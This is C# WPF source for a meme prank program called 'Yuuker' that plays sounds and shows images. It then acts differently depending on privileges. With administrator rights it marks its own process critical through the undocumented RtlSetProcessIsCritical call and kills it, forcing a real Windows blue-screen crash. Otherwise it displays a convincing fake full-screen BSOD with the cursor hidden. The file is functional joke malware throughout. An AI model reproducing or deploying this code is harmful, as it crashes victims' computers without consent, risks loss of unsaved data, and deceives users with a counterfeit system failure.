using System;
using System.Threading.Tasks;
using System.Windows;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using System.Windows.Input;
using System.Threading;
using System.IO;

namespace Yuuker
{
    public partial class MainWindow : Window
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        public MainWindow()
        {
            InitializeComponent();
            //Hide in C# so they're visible in XAML preview

            yukko.Opacity = 0;
            circle.Visibility = Visibility.Hidden;
            osaka.Visibility = Visibility.Hidden;
            bsod.Visibility = Visibility.Hidden;
            t1.Visibility = Visibility.Hidden;
            t2.Visibility = Visibility.Hidden;
            twomp.Visibility = Visibility.Hidden;
            sbt1.Visibility = Visibility.Hidden;
            sbt2.Visibility = Visibility.Hidden;
            sbt3.Visibility = Visibility.Hidden;
            labelComplete.Visibility = Visibility.Hidden;
            sbtqr.Visibility = Visibility.Hidden;
            pagi.Visibility = Visibility.Hidden;

            //Run Script
            Script();
           // FakeBSOD();
        }
        public static bool isAdmin()
        {
            if (File.Exists("override.txt"))
            {
                return false;
            }
            else
            {
                return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                 .IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public async void Script()
        {
            await Task.Delay(1000);
            //Play Audio
            SoundPlayer sp;
            if (isAdmin())
            {
                sp = new SoundPlayer(Properties.Resources.brainrot);
            }
            else
            {
                //Play sound with fake glitch
                sp = new SoundPlayer(Properties.Resources.noadmin);
            }
            sp.Play();
            //    0,0
            //Fade in the Yuuker
            while (yukko.Opacity < 1)
            {
                yukko.Opacity += 0.01;
                await Task.Delay(10);
            }
            //    1,0
            await Task.Delay(579);
            //    2,079
            //Red vine boom circle
            circle.Visibility = Visibility.Visible;
            await Task.Delay(171);
            //    2,250
            circle.Visibility = Visibility.Hidden;
            await Task.Delay(67);
            //    2,317
            circle.Visibility = Visibility.Visible;
            await Task.Delay(153);
            //    2,470
            circle.Visibility = Visibility.Hidden;
            await Task.Delay(74);
            //    2,544
            circle.Visibility = Visibility.Visible;
            //Fade out red vine boom circle
            CircleFadeout();
            await Task.Delay(700);
            //Oh my gah
            osaka.Visibility = Visibility.Visible;
            //    3,5
            await Task.Delay(1300);
            //Selamat Pagi!
            pagi.Visibility = Visibility.Visible;
            //    4,8
            await Task.Delay(2500);
            if (isAdmin())
            {
                //Kill critical process to BSOD the machine
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                //Do a fake BSOD
                FakeBSOD();
            }
        }
        public async void CircleFadeout()
        {
            while(circle.Opacity > 0)
            {
                circle.Opacity -= 0.01;
                await Task.Delay(10);
            }
            circle.Visibility = Visibility.Hidden;
            circle.Opacity = 1;
        }

        public async void FakeBSOD()
        {
            //Code to make it more believable
            Topmost = true;
            Cursor = Cursors.None;
            await Task.Delay(500);
            bsod.Visibility = Visibility.Visible;
            await Task.Delay(25);
            twomp.Visibility = Visibility.Visible;
            await Task.Delay(10);
            t1.Visibility = Visibility.Visible;
            await Task.Delay(10);
            t2.Visibility = Visibility.Visible;
            await Task.Delay(400);
            labelComplete.Visibility = Visibility.Visible;
            await Task.Delay(10);
            sbt1.Visibility = Visibility.Visible;
            await Task.Delay(10);
            sbt2.Visibility = Visibility.Visible;
            await Task.Delay(10);
            sbt3.Visibility = Visibility.Visible;
            await Task.Delay(10);
            sbtqr.Visibility = Visibility.Visible;

            //Progress 
            await Task.Delay(2500);
            labelComplete.Text = "20% complete";
            await Task.Delay(1000);
            labelComplete.Text = "40% complete";
            await Task.Delay(1500);
            labelComplete.Text = "66% complete";
            await Task.Delay(1800);
            labelComplete.Text = "80% complete";
            await Task.Delay(1500);
            labelComplete.Text = "100% complete";
            await Task.Delay(3000);
            Application.Current.Shutdown();

        }
    }
}
